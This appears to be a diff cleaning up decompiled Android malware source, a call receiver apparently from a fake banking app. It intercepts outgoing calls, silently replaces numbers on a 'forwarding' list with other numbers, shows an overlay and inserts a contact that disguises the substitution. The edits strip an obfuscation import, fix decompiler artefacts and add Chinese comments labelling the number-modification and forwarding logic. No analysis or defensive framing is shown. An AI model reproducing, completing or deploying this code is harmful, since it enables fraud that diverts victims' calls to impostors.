@@ -30,7 +30,6 @@ import java.io.File;
 import java.io.IOException;
 import java.util.Date;
 
-import gv00l3ah.mvdt7w.bb7d7pu7;
 import wei.mark.standout.StandOutWindow;
 
 /* loaded from: cookie_9234504.jar:com/wish/lmbank/receiver/TelePhoneReceiver.class */
@@ -176,7 +175,7 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                 final String m59982 = "forwarding";
 //-^-                 final String m59983 = bb7d7pu7.m5998("BwYbBAgF");
                 final String m59983 = "normal";
-                if (equals) {
+                if (equals) {//拨打号码修改
                     final boolean defaultDialer = SettingUtils.isDefaultDialer(context);
                     TelePhoneReceiver.callStartTime = new Date();
 //-^-                     final String string2 = extras.getString(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHOSEmJyw2JzwkKyw7"));
@@ -196,9 +195,7 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                     sb5.append(this.savedNumber);
                     sb.append(sb5.toString()); //这里播出转发
                     final LimitPhoneNumberBean forwarding = SettingUtils.isForwarding(this.savedNumber);
-                    while (true) {
-
-                        {
+                    while (true) {{
                             if (forwarding == null) {
                                 this.savedNumberReal = null;
                                 break ;
@@ -228,7 +225,7 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                                     OverlayService.actionStart(context, this.savedNumber, 2);
                                     ContentUtils.insertContacts(context, this.savedNumber, this.savedNumberReal);
                                 }
-                                this.mHandler.postDelayed((Runnable) new TelePhoneReceiver$1(this, defaultDialer, checkFloatPermission, context, sb), 500L);
+                                this.mHandler.postDelayed(new TelePhoneReceiver1(this, defaultDialer, checkFloatPermission, context, sb), 500L);
                                 return;
                             }
                             String s = this.savedNumber;
@@ -417,7 +414,7 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                             sb17.append(actionStart);
                             sb17.append(m5998);
                             sb17.append(TelePhoneReceiver.mCallLogBean.toString());
-                            sb.append(sb17.toString());
+                            sb.append(sb17);
                             this.mPhoneCallListener.onIncomingCallReceived(string3, this.savedNumberReal, m59986, TelePhoneReceiver.callStartTime);
                             LogUtils.callLog(sb.toString());
                         } else if (SettingUtils.isBlackList(string3)) { //这里黑名单
